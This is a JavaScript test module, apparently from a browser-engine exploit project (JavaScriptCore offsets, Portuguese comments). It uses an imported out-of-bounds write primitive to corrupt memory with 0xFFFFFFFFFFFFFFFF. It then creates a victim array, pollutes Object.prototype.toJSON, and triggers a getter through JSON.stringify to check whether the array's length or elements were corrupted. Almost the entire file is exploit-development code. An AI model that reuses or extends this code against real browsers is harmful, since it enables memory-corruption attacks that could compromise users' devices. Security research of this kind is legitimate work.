// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForArrayCorruptionTest";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

// Variável para manter a referência ao array vítima
let victim_arr_ref;
const ORIGINAL_VICTIM_ARR_ELEMENTS = [ {a:1}, "marker_string_B", 0x12345678, true];

class CheckpointObjectForArrayTest {
    constructor(id) {
        this.id = `ArrayTestCheckpoint-${id}`;
    }
}

export function toJSON_TriggerArrayTestGetter() {
    const FNAME_toJSON = "toJSON_TriggerArrayTestGetter";
    if (this instanceof CheckpointObjectForArrayTest) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeArrayCorruptionTest"; // Nome interno
    logS3(`--- Iniciando Teste de Corrupção Especulativa de Array ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    victim_arr_ref = null;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Realizar a escrita OOB "gatilho" (valor conhecido por funcionar)
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 2. Criar o Array Vítima *APÓS* a escrita OOB gatilho
        logS3(`Criando array vítima (victim_arr_ref)...`, "info", FNAME_TEST);
        victim_arr_ref = [...ORIGINAL_VICTIM_ARR_ELEMENTS]; // Cria uma cópia
        logS3(`victim_arr_ref criado. Length inicial: ${victim_arr_ref.length}, Elemento[1]: ${victim_arr_ref[1]}`, "info", FNAME_TEST);

        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForArrayTest(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForArrayTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForArrayTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() { // Getter SÍNCRONO
                getter_called_flag = true;
                const FNAME_GETTER = "ArrayCorruption_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Inspecionando victim_arr_ref...`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, inspecionando victim_arr_ref.", error: null, details: "" };

                if (!victim_arr_ref) {
                    current_test_results.message = "victim_arr_ref era null no getter!";
                    logS3("DENTRO DO GETTER: victim_arr_ref é null!", "critical", FNAME_GETTER);
                    return 0xDEADDEAD;
                }

                let details_observed = [];
                try {
                    const current_length = victim_arr_ref.length;
                    details_observed.push(`victim_arr_ref.length atual: ${current_length}`);
                    logS3(`DENTRO DO GETTER: victim_arr_ref.length atual: ${current_length} (Original: ${ORIGINAL_VICTIM_ARR_ELEMENTS.length})`, "info", FNAME_GETTER);

                    if (current_length !== ORIGINAL_VICTIM_ARR_ELEMENTS.length) {
                        current_test_results.success = true; // Sucesso se o tamanho mudou
                        current_test_results.message = `CORRUPÇÃO DE LENGTH! Length: ${current_length}, esperado: ${ORIGINAL_VICTIM_ARR_ELEMENTS.length}`;
                        logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
                    }

                    // Verificar os elementos
                    for (let i = 0; i < Math.max(current_length, ORIGINAL_VICTIM_ARR_ELEMENTS.length); i++) {
                        let current_val_str = "FORA_DOS_LIMITES_ATUAIS";
                        let original_val_str = i < ORIGINAL_VICTIM_ARR_ELEMENTS.length ? String(ORIGINAL_VICTIM_ARR_ELEMENTS[i]) : "N/A_ORIGINAL";
                        if (typeof ORIGINAL_VICTIM_ARR_ELEMENTS[i] === 'object') original_val_str = JSON.stringify(ORIGINAL_VICTIM_ARR_ELEMENTS[i]);


                        if (i < current_length) {
                            try {
                                let val = victim_arr_ref[i];
                                current_val_str = String(val);
                                if (typeof val === 'object') current_val_str = JSON.stringify(val);

                                if (i < ORIGINAL_VICTIM_ARR_ELEMENTS.length && JSON.stringify(val) !== JSON.stringify(ORIGINAL_VICTIM_ARR_ELEMENTS[i])) {
                                     details_observed.push(`victim_arr_ref[${i}] alterado: '${current_val_str}' vs original '${original_val_str}'`);
                                    if (!current_test_results.success) { // Marcar como sucesso se não for apenas o length
                                        current_test_results.success = true;
                                        current_test_results.message = `Corrupção de elemento observada em victim_arr_ref[${i}].`;
                                    }
                                     logS3(`DENTRO DO GETTER: Corrupção em victim_arr_ref[${i}]: Atual='${current_val_str}', Original='${original_val_str}'`, "vuln", FNAME_GETTER);
                                } else if (i >= ORIGINAL_VICTIM_ARR_ELEMENTS.length) {
                                     details_observed.push(`victim_arr_ref[${i}] (extra): '${current_val_str}'`);
                                     logS3(`DENTRO DO GETTER: Elemento extra victim_arr_ref[${i}]: '${current_val_str}'`, "warn", FNAME_GETTER);
                                }

                            } catch (e_access) {
                                current_val_str = `ERRO_AO_ACESSAR: ${e_access.message}`;
                                details_observed.push(`victim_arr_ref[${i}] ERRO: ${e_access.message}`);
                                logS3(`DENTRO DO GETTER: Erro ao acessar victim_arr_ref[${i}]: ${e_access.message}`, "error", FNAME_GETTER);
                                if (!current_test_results.success) current_test_results.success = true; // Erro de acesso também é interessante
                                current_test_results.message = current_test_results.message + `; Erro acesso victim_arr_ref[${i}]`;
                            }
                        }
                        if (i < 10) { // Logar apenas alguns elementos para não poluir demais
                             logS3(`DENTRO DO GETTER: victim_arr_ref[${i}]: '${current_val_str}' (Original: '${original_val_str}')`, "info", FNAME_GETTER);
                        }
                    }
                    
                    if (!current_test_results.success && current_test_results.message === "Getter chamado, inspecionando victim_arr_ref.") {
                        current_test_results.message = "Nenhuma corrupção óbvia (length/elementos) observada em victim_arr_ref.";
                    }
                    current_test_results.details = details_observed.join('; ');

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO GERAL ao inspecionar victim_arr_ref: ${e.message}`, "error", FNAME_GETTER);
                    current_test_results.error = String(e);
                    current_test_results.message = `Erro geral inspecionando victim_arr_ref: ${e.message}`;
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerArrayTestGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), details: "" };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
        if (getterPollutionApplied && CheckpointObjectForArrayTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForArrayTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForArrayTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ARRAY CORRUPTION: ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE ARRAY CORRUPTION: Getter chamado, mas sem corrupção óbvia. ${current_test_results.message}. Detalhes: ${current_test_results.details}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE ARRAY CORRUPTION: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    victim_arr_ref = null; 
    logS3(`--- Teste de Corrupção Especulativa de Array Concluído ---`, "test", FNAME_TEST);
}
